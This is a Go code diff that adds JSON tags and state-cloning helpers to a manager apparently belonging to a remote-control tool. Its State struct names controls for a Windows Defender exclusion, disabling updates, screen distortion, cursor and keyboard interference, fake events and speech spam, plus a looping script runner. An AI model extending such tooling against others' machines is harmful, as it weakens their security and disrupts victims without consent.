@@ -13,11 +13,11 @@ import (
 )
 
 type ScriptFile struct {
-	Name     string
-	Size     int64
-	Type     string
-	Path     string
-	Checksum string
+	Name     string `json:"name"`
+	Size     int64  `json:"size"`
+	Type     string `json:"type"`
+	Path     string `json:"path"`
+	Checksum string `json:"checksum"`
 }
 
 type ScriptPayload struct {
@@ -34,38 +34,38 @@ type ManagerOptions struct {
 }
 
 type ScriptConfig struct {
-	File         *ScriptFile
-	Mode         string
-	Loop         bool
-	DelaySeconds int
+	File         *ScriptFile `json:"file,omitempty"`
+	Mode         string      `json:"mode"`
+	Loop         bool        `json:"loop"`
+	DelaySeconds int         `json:"delaySeconds"`
 }
 
 type ScriptRuntimeState struct {
-	Status          string
-	Active          bool
-	LastStartedAt   time.Time
-	LastCompletedAt time.Time
-	LastExitCode    int
-	HasExitCode     bool
-	LastError       string
-	Runs            int64
+	Status          string    `json:"status"`
+	Active          bool      `json:"active"`
+	LastStartedAt   time.Time `json:"lastStartedAt"`
+	LastCompletedAt time.Time `json:"lastCompletedAt"`
+	LastExitCode    int       `json:"lastExitCode"`
+	HasExitCode     bool      `json:"hasExitCode"`
+	LastError       string    `json:"lastError"`
+	Runs            int64     `json:"runs"`
 }
 
 type State struct {
-	DefenderExclusion bool
-	WindowsUpdate     bool
-	VisualDistortion  string
-	ScreenOrientation string
-	WallpaperMode     string
-	CursorBehavior    string
-	KeyboardMode      string
-	SoundPlayback     bool
-	SoundVolume       int
-	Script            ScriptConfig
-	ScriptRuntime     ScriptRuntimeState
-	FakeEventMode     string
-	SpeechSpam        bool
-	AutoMinimize      bool
+	DefenderExclusion bool               `json:"defenderExclusion"`
+	WindowsUpdate     bool               `json:"windowsUpdate"`
+	VisualDistortion  string             `json:"visualDistortion"`
+	ScreenOrientation string             `json:"screenOrientation"`
+	WallpaperMode     string             `json:"wallpaperMode"`
+	CursorBehavior    string             `json:"cursorBehavior"`
+	KeyboardMode      string             `json:"keyboardMode"`
+	SoundPlayback     bool               `json:"soundPlayback"`
+	SoundVolume       int                `json:"soundVolume"`
+	Script            ScriptConfig       `json:"script"`
+	ScriptRuntime     ScriptRuntimeState `json:"scriptRuntime"`
+	FakeEventMode     string             `json:"fakeEventMode"`
+	SpeechSpam        bool               `json:"speechSpam"`
+	AutoMinimize      bool               `json:"autoMinimize"`
 }
 
 type Manager struct {
@@ -74,6 +74,29 @@ type Manager struct {
 	scriptDir  string
 	platform   PlatformService
 	platformMu sync.RWMutex
+}
+
+func cloneScriptFile(file *ScriptFile) *ScriptFile {
+	if file == nil {
+		return nil
+	}
+	copy := *file
+	return &copy
+}
+
+func cloneScriptConfig(cfg ScriptConfig) ScriptConfig {
+	clone := cfg
+	if cfg.File != nil {
+		clone.File = cloneScriptFile(cfg.File)
+	}
+	return clone
+}
+
+func cloneState(state State) State {
+	clone := state
+	clone.Script = cloneScriptConfig(state.Script)
+	clone.ScriptRuntime = state.ScriptRuntime
+	return clone
 }
 
 func NewManager(opts ManagerOptions) *Manager {
@@ -167,8 +190,9 @@ func (m *Manager) Snapshot() State {
 		return State{}
 	}
 	m.mu.RLock()
-	defer m.mu.RUnlock()
-	return m.state
+	state := cloneState(m.state)
+	m.mu.RUnlock()
+	return state
 }
 
 func (m *Manager) SetScriptRuntime(state ScriptRuntimeState) {
@@ -177,6 +201,16 @@ func (m *Manager) SetScriptRuntime(state ScriptRuntimeState) {
 	}
 	m.mu.Lock()
 	m.state.ScriptRuntime = state
+	m.mu.Unlock()
+}
+
+func (m *Manager) ApplyState(state State) {
+	if m == nil {
+		return
+	}
+	cloned := cloneState(state)
+	m.mu.Lock()
+	m.state = cloned
 	m.mu.Unlock()
 }
 
